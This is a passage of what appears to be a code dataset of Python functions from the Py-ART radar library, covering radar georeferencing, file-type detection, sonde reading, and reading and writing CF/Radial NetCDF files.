        drift_data = bin2_to_angle(xhdr['irs_drift'])
    elif heading_source == 'aamps':
        heading_data = bin2_to_angle(xhdr['aamps_heading'])
        roll_data = bin2_to_angle(xhdr['aamps_roll'])
        pitch_data = bin2_to_angle(xhdr['aamps_pitch'])
        drift_data = bin2_to_angle(xhdr['aamps_drift'])
    else:
        raise ValueError('Unknown heading_source')
    heading['data'] = heading_data
    roll['data'] = roll_data
    pitch['data'] = pitch_data
    drift['data'] = drift_data
    (az, elev) = _georeference_yprime(roll_data, pitch_data, heading_data, drift_data, rotation_data, tilt_data)
    azimuth['data'] = az
    elevation['data'] = elev
    georefs_applied = filemetadata('georefs_applied')
    georefs_applied['data'] = np.ones(az.shape, dtype='int8')
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    if position_source == 'gps':
        lat_data = bin4_to_angle(xhdr['gps_lat'])
        lon_data = bin4_to_angle(xhdr['gps_long'])
        alt_data = xhdr['gps_alt'] / 100.0
    elif position_source == 'aamps':
        lat_data = bin4_to_angle(xhdr['aamps_lat'])
        lon_data = bin4_to_angle(xhdr['aamps_long'])
        alt_data = xhdr['aamps_alt'] / 100.0
    elif position_source == 'irs':
        lat_data = bin4_to_angle(xhdr['irs_lat'])
        lon_data = bin4_to_angle(xhdr['irs_long'])
        alt_data = xhdr['gps_alt'] / 100.0
    else:
        raise ValueError('Invalid position_source')
    latitude['data'] = lat_data
    longitude['data'] = lon_data
    altitude['data'] = alt_data
    extended_header_params = {'heading': heading, 'roll': roll, 'pitch': pitch, 'drift': drift, 'rotation': rotation, 'tilt': tilt, 'georefs_applied': georefs_applied}
    return (latitude, longitude, altitude, extended_header_params)"
ARM-DOE/pyart,_georeference_yprime,"def _georeference_yprime(roll, pitch, heading, drift, rotation, tilt):
    """"""
    Compute georeferenced azimuth and elevation angles for a Y-prime radar.

    This is the georeferencing needed for the tail doppler radar on the
    NOAA P3 aircraft.
    """"""
    R = np.radians(roll)
    P = np.radians(pitch)
    H = np.radians(heading)
    D = np.radians(drift)
    T = H + D
    theta_a = np.radians(rotation)
    tau_a = np.radians(tilt)
    x_t = np.cos(theta_a + R) * np.sin(D) * np.cos(tau_a) * np.sin(P) + np.cos(D) * np.sin(theta_a + R) * np.cos(tau_a) - np.sin(D) * np.cos(P) * np.sin(tau_a)
    y_t = -np.cos(theta_a + R) * np.cos(D) * np.cos(tau_a) * np.sin(P) + np.sin(D) * np.sin(theta_a + R) * np.cos(tau_a) + np.cos(P) * np.cos(D) * np.sin(tau_a)
    z_t = np.cos(P) * np.cos(tau_a) * np.cos(theta_a + R) + np.sin(P) * np.sin(tau_a)
    lambda_t = np.arctan2(x_t, y_t)
    azimuth = np.fmod(lambda_t + T, 2 * np.pi)
    elevation = np.arcsin(z_t)
    azimuth = np.degrees(azimuth)
    azimuth[azimuth < 0] += 360.0
    elevation = np.degrees(elevation)
    elevation[elevation > 180] -= 360.0
    return (azimuth, elevation)"
ARM-DOE/pyart,read_arm_sonde,"def read_arm_sonde(filename):
    """"""
    Read a ARM sonde file returning a wind profile.

    Parameters
    ----------
    filename : str
        Name of ARM sonde NetCDF file to read data from.

    Return
    ------
    launch_datetime : datetime
        Date and time corresponding to radiosonde launch time, i.e., first
        recorded time.
    profile : HorizontalWindProfile
        Profile of the horizontal winds

    """"""
    dset = netCDF4.Dataset(filename, 'r')
    launch_datetime = netCDF4.num2date(dset.variables['time'][0], dset.variables['time'].units)
    height = dset.variables['alt'][:]
    speed = dset.variables['wspd'][:]
    direction = dset.variables['deg'][:]
    lat = dset.variables['lat'][:]
    lon = dset.variables['lon'][:]
    profile = HorizontalWindProfile(height, speed, direction, latitude=lat, longitude=lon)
    dset.close()
    return (launch_datetime, profile)"
ARM-DOE/pyart,read_arm_sonde_vap,"def read_arm_sonde_vap(filename, radar=None, target_datetime=None):
    """"""
    Read a ARM interpolated or merged sonde returning a wind profile.

    Parameters
    ----------
    filename : str
        Name of ARM interpolate or merged sonde NetCDF file to read data from.
    radar : Radar, optional
        If provided the profile returned is that which is closest in time to
        the first ray collected in this radar. Either radar or target_datetime
        must be provided.
    target_datetime : datetime, optional
        If specified the profile returned is that which is closest in time to
        this datetime.

    Return
    ------
    profile_datetime : datetime
        Date and time of the profile.
    profile : HorizontalWindProfile
        Profile of the horizontal winds.

    """"""
    if radar is None and target_datetime is None:
        raise ValueError('Either radar or target_datetime must be specified.')
    if radar is not None and target_datetime is not None:
        raise ValueError('Either radar or target_datetime must be specified, not both.')
    if radar is not None:
        time_0 = radar.time['data'][0]
        time_units = radar.time['units']
        target_datetime = netCDF4.num2date(time_0, time_units)
    dset = netCDF4.Dataset(filename, 'r')
    sonde_datetimes = netCDF4.num2date(dset.variables['time'][:], dset.variables['time'].units)
    idx = np.abs(sonde_datetimes - target_datetime).argmin()
    profile_datetime = sonde_datetimes[idx]
    height = dset.variables['height'][:] * 1000
    speed = dset.variables['wspd'][idx, :]
    direction = dset.variables['wdir'][idx, :]
    profile = HorizontalWindProfile(height, speed, direction)
    dset.close()
    return (profile_datetime, profile)"
ARM-DOE/pyart,read,"def read(filename, use_rsl=False, **kwargs):
    """"""
    Read a radar file and return a radar object.

    Additional parameters are passed to the underlying read_* function.

    Parameters
    ----------
    filename : str
        Name of radar file to read.
    use_rsl : bool
        True will use the TRMM RSL library to read files which are supported
        both natively and by RSL. False will choose the native read function.
        RSL will always be used to read a file if it is not supported
        natively.

    Other Parameters
    -------------------
    field_names : dict, optional
        Dictionary mapping file data type names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        metadata configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the metadata configuration file will be used.
    file_field_names : bool, optional
        True to use the file data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters.
    delay_field_loading : bool
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned Radar object will contain
        LazyLoadDict objects not dict objects. Not all file types support this
        parameter.

    Returns
    -------
    radar : Radar
        Radar object. A TypeError is raised if the format cannot be
        determined.

    """"""
    filetype = determine_filetype(filename)
    if filetype == 'BZ2':
        bzfile = bz2.BZ2File(filename)
        try:
            radar = read(bzfile, use_rsl, **kwargs)
        except:
            raise ValueError('Bzip file cannot be read compressed, uncompress and try again')
        finally:
            bzfile.close()
        return radar
    if filetype == 'GZ':
        gzfile = gzip.open(filename, 'rb')
        try:
            radar = read(gzfile, use_rsl, **kwargs)
        except:
            raise ValueError('Gzip file cannot be read compressed, uncompress and try again')
        finally:
            gzfile.close()
        return radar
    if filetype == 'MDV':
        return read_mdv(filename, **kwargs)
    if filetype == 'NETCDF3' or filetype == 'NETCDF4':
        dset = netCDF4.Dataset(filename)
        if 'cdm_data_type' in dset.ncattrs():
            dset.close()
            return read_nexrad_cdm(filename, **kwargs)
        else:
            dset.close()
            return read_cfradial(filename, **kwargs)
    if filetype == 'WSR88D':
        return read_nexrad_archive(filename, **kwargs)
    if filetype == 'CHL':
        return read_chl(filename, **kwargs)
    if filetype == 'NEXRADL3':
        return read_nexrad_level3(filename, **kwargs)
    if filetype == 'SIGMET':
        if use_rsl:
            return read_rsl(filename, **kwargs)
        else:
            return read_sigmet(filename, **kwargs)
    if filetype == 'UF':
        if use_rsl:
            return read_rsl(filename, **kwargs)
        else:
            return read_uf(filename, **kwargs)
    rsl_formats = ['HDF4', 'RSL', 'DORAD', 'LASSEN']
    if filetype in rsl_formats and _RSL_AVAILABLE:
        return read_rsl(filename, **kwargs)
    raise TypeError('Unknown or unsupported file format: ' + filetype)"
ARM-DOE/pyart,determine_filetype,"def determine_filetype(filename):
    """"""
    Return the filetype of a given file by examining the first few bytes.

    The following filetypes are detected:

    * 'MDV'
    * 'NETCDF3'
    * 'NETCDF4'
    * 'WSR88D'
    * 'NEXRADL3'
    * 'UF'
    * 'HDF4'
    * 'RSL'
    * 'DORAD'
    * 'SIGMET'
    * 'LASSEN'
    * 'BZ2'
    * 'GZ'
    * 'UNKNOWN'

    Parameters
    ----------
    filename : str
        Name of file to examine.

    Returns
    -------
    filetype : str
        Type of file.

    """"""
    try:
        f = open(filename, 'rb')
        begin = f.read(12)
        f.close()
    except TypeError:
        f = filename
        begin = f.read(12)
        f.seek(-12, 1)
    mdv_signature = b'\x00\x00\x03\xf8\x00\x007>\x00\x00\x00\x01'
    if begin[:12] == mdv_signature:
        return 'MDV'
    chl_signature = b'\x04\x00\xa8Z'
    if begin[:4] == chl_signature:
        return 'CHL'
    if begin[:3] == b'CDF':
        return 'NETCDF3'
    hdf5_signature = b'\x89HDF\r\n\x1a\n'
    if begin[:8] == hdf5_signature:
        return 'NETCDF4'
    nexrad_l3_signature = b'SDUS'
    if begin[:4] == nexrad_l3_signature:
        return 'NEXRADL3'
    if begin[:4] == b'\x01\r\r\n':
        return 'NEXRADL3'
    if begin[:9] == b'ARCHIVE2.' or begin[:7] == b'AR2V000':
        return 'WSR88D'
    if begin[:2] == b'UF' or begin[2:4] == b'UF' or begin[4:6] == b'UF':
        return 'UF'
    if begin[:4] == b'SSWB' or begin[:4] == b'VOLD' or begin[:4] == b'COMM':
        return 'DORADE'
    if begin[4:11] == b'SUNRISE':
        return 'LASSEN'
    if begin[:3] == b'RSL':
        return 'RSL'
    hdf4_signature = b'\x0e\x03\x13\x01'
    if begin[:4] == hdf4_signature:
        return 'HDF4'
    sigmet_signature = b'\x1b'
    if begin[0:1] == sigmet_signature:
        return 'SIGMET'
    bzip2_signature = b'BZh'
    if begin[:3] == bzip2_signature:
        return 'BZ2'
    gzip_signature = b'\x1f\x8b'
    if begin[:2] == gzip_signature:
        return 'GZ'
    return 'UNKNOWN'"
ARM-DOE/pyart,read_cfradial,"def read_cfradial(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, delay_field_loading=False, **kwargs):
    """"""
    Read a Cfradial 1.4 netCDF file.

    Parameters
    ----------
    filename : str
        Name of CF/Radial 1.4 netCDF file to read data from.
    field_names : dict, optional
        Dictionary mapping field names in the file names to radar field names.
        Unlike other read functions, fields not in this dictionary or having a
        value of None are still included in the radar.fields dictionary, to
        exclude them use the `exclude_fields` parameter. Fields which are
        mapped by this dictionary will be renamed from key to value.
    additional_metadata : dict of dicts, optional
        This parameter is not used, it is included for uniformity.
    file_field_names : bool, optional
        True to force the use of the field names from the file in which
        case the `field_names` parameter is ignored. False will use to
        `field_names` parameter to rename fields.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    delay_field_loading : bool
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned Radar object will contain
        LazyLoadDict objects not dict objects. Delayed field loading will not
        provide any speedup in file where the number of gates vary between
        rays (ngates_vary=True) and is not recommended.

    Returns
    -------
    radar : Radar
        Radar object.

    Notes
    -----
    This function has not been tested on ""stream"" Cfradial files.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('cfradial', field_names, additional_metadata, file_field_names, exclude_fields)
    ncobj = netCDF4.Dataset(filename)
    ncvars = ncobj.variables
    metadata = {k: getattr(ncobj, k) for k in ncobj.ncattrs()}
    if 'n_gates_vary' in metadata:
        metadata['n_gates_vary'] = 'false'
    if 'volume_number' in ncvars:
        if np.ma.isMaskedArray(ncvars['volume_number'][:]):
            metadata['volume_number'] = int(np.ma.getdata(ncvars['volume_number'][:].flatten()))
        else:
            metadata['volume_number'] = int(ncvars['volume_number'][:])
    else:
        metadata['volume_number'] = 0
    global_vars = {'platform_type': 'fixed', 'instrument_type': 'radar', 'primary_axis': 'axis_z'}
    for (var, default_value) in global_vars.items():
        if var in ncvars:
            metadata[var] = str(netCDF4.chartostring(ncvars[var][:]))
        else:
            metadata[var] = default_value
    time = _ncvar_to_dict(ncvars['time'])
    _range = _ncvar_to_dict(ncvars['range'])
    latitude = _ncvar_to_dict(ncvars['latitude'])
    longitude = _ncvar_to_dict(ncvars['longitude'])
    altitude = _ncvar_to_dict(ncvars['altitude'])
    if 'altitude_agl' in ncvars:
        altitude_agl = _ncvar_to_dict(ncvars['altitude_agl'])
    else:
        altitude_agl = None
    sweep_mode = _ncvar_to_dict(ncvars['sweep_mode'])
    fixed_angle = _ncvar_to_dict(ncvars['fixed_angle'])
    sweep_start_ray_index = _ncvar_to_dict(ncvars['sweep_start_ray_index'])
    sweep_end_ray_index = _ncvar_to_dict(ncvars['sweep_end_ray_index'])
    if 'sweep_number' in ncvars:
        sweep_number = _ncvar_to_dict(ncvars['sweep_number'])
    else:
        nsweeps = len(sweep_start_ray_index['data'])
        sweep_number = filemetadata('sweep_number')
        sweep_number['data'] = np.arange(nsweeps, dtype='float32')
        warnings.warn('Warning: File violates CF/Radial convention. ' + 'Missing sweep_number variable')
    if 'target_scan_rate' in ncvars:
        target_scan_rate = _ncvar_to_dict(ncvars['target_scan_rate'])
    else:
        target_scan_rate = None
    if 'rays_are_indexed' in ncvars:
        rays_are_indexed = _ncvar_to_dict(ncvars['rays_are_indexed'])
    else:
        rays_are_indexed = None
    if 'ray_angle_res' in ncvars:
        ray_angle_res = _ncvar_to_dict(ncvars['ray_angle_res'])
    else:
        ray_angle_res = None
    if not hasattr(ncobj, 'scan_name'):
        scan_name = ''
    else:
        scan_name = ncobj.scan_name
    if len(scan_name) > 0:
        mode = scan_name
    else:
        try:
            mode = netCDF4.chartostring(sweep_mode['data'][0])[()].decode('utf-8')
        except AttributeError:
            mode = netCDF4.chartostring(sweep_mode['data'][0])[()]
    mode = mode.strip()
    if mode == 'rhi':
        scan_type = 'rhi'
    elif mode == 'vertical_pointing':
        scan_type = 'vpt'
    elif mode == 'azimuth_surveillance':
        scan_type = 'ppi'
    elif mode == 'elevation_surveillance':
        scan_type = 'rhi'
    elif mode == 'manual_ppi':
        scan_type = 'ppi'
    elif mode == 'manual_rhi':
        scan_type = 'rhi'
    elif 'sur' in mode:
        scan_type = 'ppi'
    elif 'sec' in mode:
        scan_type = 'sector'
    elif 'rhi' in mode:
        scan_type = 'rhi'
    elif 'ppi' in mode:
        scan_type = 'ppi'
    else:
        scan_type = 'other'
    azimuth = _ncvar_to_dict(ncvars['azimuth'])
    elevation = _ncvar_to_dict(ncvars['elevation'])
    if 'scan_rate' in ncvars:
        scan_rate = _ncvar_to_dict(ncvars['scan_rate'])
    else:
        scan_rate = None
    if 'antenna_transition' in ncvars:
        antenna_transition = _ncvar_to_dict(ncvars['antenna_transition'])
    else:
        antenna_transition = None
    if 'rotation' in ncvars:
        rotation = _ncvar_to_dict(ncvars['rotation'])
    else:
        rotation = None
    if 'tilt' in ncvars:
        tilt = _ncvar_to_dict(ncvars['tilt'])
    else:
        tilt = None
    if 'roll' in ncvars:
        roll = _ncvar_to_dict(ncvars['roll'])
    else:
        roll = None
    if 'drift' in ncvars:
        drift = _ncvar_to_dict(ncvars['drift'])
    else:
        drift = None
    if 'heading' in ncvars:
        heading = _ncvar_to_dict(ncvars['heading'])
    else:
        heading = None
    if 'pitch' in ncvars:
        pitch = _ncvar_to_dict(ncvars['pitch'])
    else:
        pitch = None
    if 'georefs_applied' in ncvars:
        georefs_applied = _ncvar_to_dict(ncvars['georefs_applied'])
    else:
        georefs_applied = None
    if 'ray_n_gates' in ncvars:
        keys = [k for (k, v) in ncvars.items() if v.dimensions == ('n_points',)]
    else:
        keys = [k for (k, v) in ncvars.items() if v.dimensions == ('time', 'range')]
    fields = {}
    for key in keys:
        field_name = filemetadata.get_field_name(key)
        if field_name is None:
            if exclude_fields is not None and key in exclude_fields:
                if key not in include_fields:
                    continue
            if include_fields is None or key in include_fields:
                field_name = key
            else:
                continue
        fields[field_name] = _ncvar_to_dict(ncvars[key], delay_field_loading)
    if 'ray_n_gates' in ncvars:
        shape = (len(ncvars['time']), len(ncvars['range']))
        ray_n_gates = ncvars['ray_n_gates'][:]
        ray_start_index = ncvars['ray_start_index'][:]
        for dic in fields.values():
            _unpack_variable_gate_field_dic(dic, shape, ray_n_gates, ray_start_index)
    keys = [k for k in _INSTRUMENT_PARAMS_DIMS.keys() if k in ncvars]
    instrument_parameters = {k: _ncvar_to_dict(ncvars[k]) for k in keys}
    if instrument_parameters == {}:
        instrument_parameters = None
    keys = _find_all_meta_group_vars(ncvars, 'radar_calibration')
    radar_calibration = {k: _ncvar_to_dict(ncvars[k]) for k in keys}
    if radar_calibration == {}:
        radar_calibration = None
    if not delay_field_loading:
        ncobj.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters, radar_calibration=radar_calibration, altitude_agl=altitude_agl, scan_rate=scan_rate, antenna_transition=antenna_transition, target_scan_rate=target_scan_rate, rays_are_indexed=rays_are_indexed, ray_angle_res=ray_angle_res, rotation=rotation, tilt=tilt, roll=roll, drift=drift, heading=heading, pitch=pitch, georefs_applied=georefs_applied)"
ARM-DOE/pyart,_find_all_meta_group_vars,"def _find_all_meta_group_vars(ncvars, meta_group_name):
    """"""
    Return a list of all variables which are in a given meta_group.
    """"""
    return [k for (k, v) in ncvars.items() if 'meta_group' in v.ncattrs() and v.meta_group == meta_group_name]"
ARM-DOE/pyart,_ncvar_to_dict,"def _ncvar_to_dict(ncvar, lazydict=False):
    """"""Convert a NetCDF Dataset variable to a dictionary.""""""
    d = {k: getattr(ncvar, k) for k in ncvar.ncattrs() if k not in ['scale_factor', 'add_offset']}
    data_extractor = _NetCDFVariableDataExtractor(ncvar)
    if lazydict:
        d = LazyLoadDict(d)
        d.set_lazy('data', data_extractor)
    else:
        d['data'] = data_extractor()
    return d"
ARM-DOE/pyart,_unpack_variable_gate_field_dic,"def _unpack_variable_gate_field_dic(dic, shape, ray_n_gates, ray_start_index):
    """"""Create a 2D array from a 1D field data, dic update in place.""""""
    fdata = dic['data']
    data = np.ma.masked_all(shape, dtype=fdata.dtype)
    for (i, (gates, idx)) in enumerate(zip(ray_n_gates, ray_start_index)):
        data[i, :gates] = fdata[idx:idx + gates]
    dic['data'] = data
    return"
ARM-DOE/pyart,write_cfradial,"def write_cfradial(filename, radar, format='NETCDF4', include_fields=None, time_reference=None, arm_time_variables=False):
    """"""
    Write a Radar object to a CF/Radial compliant netCDF file.

    The files produced by this routine follow the `CF/Radial standard`_.
    Attempts are also made to to meet many of the standards outlined in the
    `ARM Data File Standards`_.

    .. _CF/Radial standard: http://www.ral.ucar.edu/projects/titan/docs/radial_formats/cfradial.html
    .. _ARM Data File Standards: https://docs.google.com/document/d/1gBMw4Kje6v8LBlsrjaGFfSLoU0jRx-07TIazpthZGt0/edit?pli=1

    To control how the netCDF variables are created, set any of the following
    keys in the radar attribute dictionaries.

        * _Zlib
        * _DeflateLevel
        * _Shuffle
        * _Fletcher32
        * _Continguous
        * _ChunkSizes
        * _Endianness
        * _Least_significant_digit
        * _FillValue

    See the netCDF4 documentation for details on these settings.

    Parameters
    ----------
    filename : str
        Filename to create.
    radar : Radar
        Radar object.
    format : str, optional
        NetCDF format, one of 'NETCDF4', 'NETCDF4_CLASSIC',
        'NETCDF3_CLASSIC' or 'NETCDF3_64BIT'. See netCDF4 documentation for
        details.
    include_fields : list, optional
        Fields to write out to NETCDF file. Default is None and will include
        all fields from the original radar object.
    time_reference : bool
        True to include a time_reference variable, False will not include
        this variable. The default, None, will include the time_reference
        variable when the first time value is non-zero.
    arm_time_variables : bool
        True to create the ARM standard time variables base_time and
        time_offset, False will not create these variables.

    """"""
    dataset = netCDF4.Dataset(filename, 'w', format=format)
    max_str_len = len(radar.sweep_mode['data'][0])
    for k in ['follow_mode', 'prt_mode', 'polarization_mode']:
        if radar.instrument_parameters is not None and k in radar.instrument_parameters:
            sdim_length = len(radar.instrument_parameters[k]['data'][0])
            max_str_len = max(max_str_len, sdim_length)
    str_len = max(max_str_len, 32)
    dataset.createDimension('time', None)
    dataset.createDimension('range', radar.ngates)
    dataset.createDimension('sweep', radar.nsweeps)
    dataset.createDimension('string_length', str_len)
    metadata_copy = dict(radar.metadata)
    global_variables = ['volume_number', 'platform_type', 'instrument_type', 'primary_axis', 'time_coverage_start', 'time_coverage_end', 'time_reference']
    for var in global_variables:
        if var in metadata_copy:
            metadata_copy.pop(var)
    if 'history' in metadata_copy:
        history = metadata_copy.pop('history')
    else:
        user = getpass.getuser()
        node = platform.node()
        time_str = datetime.datetime.now().isoformat()
        t = (user, node, time_str)
        history = 'created by {} on {} at {} using Py-ART'.format(*t)
    dataset.setncatts(metadata_copy)
    if 'Conventions' not in dataset.ncattrs():
        dataset.setncattr('Conventions', 'CF/Radial')
    dataset.setncattr('history', history)
    if arm_time_variables:
        dt = netCDF4.num2date(radar.time['data'][0], radar.time['units'], only_use_cftime_datetimes=False, only_use_python_datetimes=True)
        td = dt - datetime.datetime.utcfromtimestamp(0)
        base_time = {'data': np.array([td.seconds + td.days * 24 * 3600], 'int32'), 'string': dt.strftime('%d-%b-%Y,%H:%M:%S GMT'), 'units': 'seconds since 1970-1-1 0:00:00 0:00', 'ancillary_variables': 'time_offset', 'long_name': 'Base time in Epoch'}
        _create_ncvar(base_time, dataset, 'base_time', ())
        time_offset = {'data': radar.time['data'], 'long_name': 'Time offset from base_time', 'units': radar.time['units'].replace('T', ' ').replace('Z', ''), 'ancillary_variables': 'time_offset', 'calendar': 'gregorian'}
        _create_ncvar(time_offset, dataset, 'time_offset', ('time',))
    _create_ncvar(radar.time, dataset, 'time', ('time',))
    _create_ncvar(radar.range, dataset, 'range', ('range',))
    _create_ncvar(radar.azimuth, dataset, 'azimuth', ('time',))
    _create_ncvar(radar.elevation, dataset, 'elevation', ('time',))
    if radar.scan_rate is not None:
        _create_ncvar(radar.scan_rate, dataset, 'scan_rate', ('time',))
    if radar.antenna_transition is not None:
        _create_ncvar(radar.antenna_transition, dataset, 'antenna_transition', ('time',))
    field_check = 0
    if include_fields is not None:
        for (field, dic) in radar.fields.items():
            if field in include_fields:
                field_check += 1
                _create_ncvar(dic, dataset, field, ('time', 'range'))
            else:
                continue
        if field_check == 0:
            warnings.warn('No new fields were added, as no field matches were made. Please check that field names in the include field list match up with the field names in the radar object.', UserWarning)
    else:
        for (field, dic) in radar.fields.items():
            _create_ncvar(dic, dataset, field, ('time', 'range'))
    if 'field_names' not in dataset.ncattrs() and include_fields is None:
        dataset.setncattr('field_names', ', '.join(radar.fields.keys()))
    elif 'field_names' not in dataset.ncattrs() and include_fields is not None:
        dataset.setncattr('field_names', ', '.join(include_fields))
    elif 'field_names' in dataset.ncattrs() and include_fields is not None:
        dataset.delncattr('field_names')
        dataset.setncattr('field_names', ', '.join(include_fields))
    _create_ncvar(radar.sweep_number, dataset, 'sweep_number', ('sweep',))
    _create_ncvar(radar.fixed_angle, dataset, 'fixed_angle', ('sweep',))
    _create_ncvar(radar.sweep_start_ray_index, dataset, 'sweep_start_ray_index', ('sweep',))
    _create_ncvar(radar.sweep_end_ray_index, dataset, 'sweep_end_ray_index', ('sweep',))
    _create_ncvar(radar.sweep_mode, dataset, 'sweep_mode', ('sweep', 'string_length'))
    if radar.target_scan_rate is not None:
        _create_ncvar(radar.target_scan_rate, dataset, 'target_scan_rate', ('sweep',))
    if radar.rays_are_indexed is not None:
        _create_ncvar(radar.rays_are_indexed, dataset, 'rays_are_indexed', ('sweep', 'string_length'))
    if radar.ray_angle_res is not None:
        _create_ncvar(radar.ray_angle_res, dataset, 'ray_angle_res', ('sweep',))
    if radar.instrument_parameters is not None and 'frequency' in radar.instrument_parameters.keys():
        size = len(radar.instrument_parameters['frequency']['data'])
        dataset.createDimension('frequency', size)
    if radar.instrument_parameters is not None:
        for k in radar.instrument_parameters.keys():
            if k in _INSTRUMENT_PARAMS_DIMS:
                dim = _INSTRUMENT_PARAMS_DIMS[k]
                _create_ncvar(radar.instrument_parameters[k], dataset, k, dim)
            else:
                message = 'Unknown instrument parameter: %s, ' % k + 'not written to file.'
                warnings.warn(message)
    if radar.radar_calibration is not None and radar.radar_calibration != {}:
        size = [len(d['data']) for (k, d) in radar.radar_calibration.items() if k not in ['r_calib_index', 'r_calib_time']][0]
        dataset.createDimension('r_calib', size)
        for (key, dic) in radar.radar_calibration.items():
            if key == 'r_calib_index':
                dims = ('time',)
            elif key == 'r_calib_time':
                dims = ('r_calib', 'string_length')
            else:
                dims = ('r_calib',)
            _create_ncvar(dic, dataset, key, dims)
    if radar.latitude['data'].size == 1:
        _create_ncvar(radar.latitude, dataset, 'latitude', ())
        _create_ncvar(radar.longitude, dataset, 'longitude', ())
        _create_ncvar(radar.altitude, dataset, 'altitude', ())
        if radar.altitude_agl is not None:
            _create_ncvar(radar.altitude_agl, dataset, 'altitude_agl', ())
    else:
        _create_ncvar(radar.latitude, dataset, 'latitude', ('time',))
        _create_ncvar(radar.longitude, dataset, 'longitude', ('time',))
        _create_ncvar(radar.altitude, dataset, 'altitude', ('time',))
        if radar.altitude_agl is not None:
            _create_ncvar(radar.altitude_agl, dataset, 'altitude_agl', ('time',))
    time_dim = ('string_length',)
    units = radar.time['units']
    start_dt = netCDF4.num2date(radar.time['data'][0], units, only_use_cftime_datetimes=False, only_use_python_datetimes=True)
    if start_dt.microsecond != 0:
        start_dt -= datetime.timedelta(microseconds=start_dt.microsecond)
    end_dt = netCDF4.num2date(radar.time['data'][-1], units, only_use_cftime_datetimes=False, only_use_python_datetimes=True)
    if end_dt.microsecond != 0:
        end_dt += datetime.timedelta(seconds=1) - datetime.timedelta(microseconds=end_dt.microsecond)
    start_dic = {'data': np.array(start_dt.isoformat() + 'Z', dtype='S'), 'long_name': 'UTC time of first ray in the file', 'units': 'unitless'}
    end_dic = {'data': np.array(end_dt.isoformat() + 'Z', dtype='S'), 'long_name': 'UTC time of last ray in the file', 'units': 'unitless'}
    _create_ncvar(start_dic, dataset, 'time_coverage_start', time_dim)
    _create_ncvar(end_dic, dataset, 'time_coverage_end', time_dim)
    if time_reference is None:
        if radar.time['data'][0] == 0:
            time_reference = False
        else:
            time_reference = True
    if time_reference:
        ref_dic = {'data': np.array(radar.time['units'][-20:], dtype='S'), 'long_name': 'UTC time reference', 'units': 'unitless'}
        _create_ncvar(ref_dic, dataset, 'time_reference', time_dim)
    vol_dic = {'long_name': 'Volume number', 'units': 'unitless'}
    if 'volume_number' in radar.metadata:
        vol_dic['data'] = np.array([radar.metadata['volume_number']], dtype='int32')
    else:
        vol_dic['data'] = np.array([0], dtype='int32')
    _create_ncvar(vol_dic, dataset, 'volume_number', ())
    if 'platform_type' in radar.metadata:
        dic = {'long_name': 'Platform type', 'data': np.array(radar.metadata['platform_type'], dtype='S')}
        _create_ncvar(dic, dataset, 'platform_type', ('string_length',))
    if 'instrument_type' in radar.metadata:
        dic = {'long_name': 'Instrument type', 'data': np.array(radar.metadata['instrument_type'], dtype='S')}
        _create_ncvar(dic, dataset, 'instrument_type', ('string_length',))
    if 'primary_axis' in radar.metadata:
        dic = {'long_name': 'Primary axis', 'data': np.array(radar.metadata['primary_axis'], dtype='S')}
        _create_ncvar(dic, dataset, 'primary_axis', ('string_length',))
    if radar.rotation is not None:
        _create_ncvar(radar.rotation, dataset, 'rotation', ('time',))
    if radar.tilt is not None:
        _create_ncvar(radar.tilt, dataset, 'tilt', ('time',))
    if radar.roll is not None:
        _create_ncvar(radar.roll, dataset, 'roll', ('time',))
    if radar.drift is not None:
        _create_ncvar(radar.drift, dataset, 'drift', ('time',))
    if radar.heading is not None:
        _create_ncvar(radar.heading, dataset, 'heading', ('time',))
    if radar.pitch is not None:
        _create_ncvar(radar.pitch, dataset, 'pitch', ('time',))
    if radar.georefs_applied is not None:
        _create_ncvar(radar.georefs_applied, dataset, 'georefs_applied', ('time',))
    dataset.close()"
ARM-DOE/pyart,_create_ncvar,"def _create_ncvar(dic, dataset, name, dimensions):
    """"""
    Create and fill a Variable in a netCDF Dataset object.

    Parameters
    ----------
    dic : dict
        Radar dictionary to containing variable data and meta-data.
    dataset : Dataset
        NetCDF dataset to create variable in.
    name : str
        Name of variable to create.
    dimension : tuple of str
        Dimension of variable.

    """"""
    data = dic['data']
    if isinstance(data, np.ndarray) is not True:
        warnings.warn('Warning, converting non-array to array:%s' % name)
        data = np.array(data)
    if data.dtype.char == 'U':
        data = data.astype('S')
    if data.dtype.char == 'S' and data.dtype != 'S1':
        data = stringarray_to_chararray(data)
    special_keys = {'_Zlib': 'zlib', '_DeflateLevel': 'complevel', '_Shuffle': 'shuffle', '_Fletcher32': 'fletcher32', '_Continguous': 'contiguous', '_ChunkSizes': 'chunksizes', '_Endianness': 'endian', '_Least_significant_digit': 'least_significant_digit', '_FillValue': 'fill_value'}
    kwargs = {'zlib': True}
    for (dic_key, kwargs_key) in special_keys.items():
        if dic_key in dic:
            kwargs[kwargs_key] = dic[dic_key]
    if '_Write_as_dtype' in dic:
        dtype = np.dtype(dic['_Write_as_dtype'])
        if np.issubdtype(dtype, np.integer):
            if 'scale_factor' not in dic and 'add_offset' not in dic:
                (scale, offset, fill) = _calculate_scale_and_offset(dic, dtype)
                dic['scale_factor'] = scale
                dic['add_offset'] = offset
                dic['_FillValue'] = fill
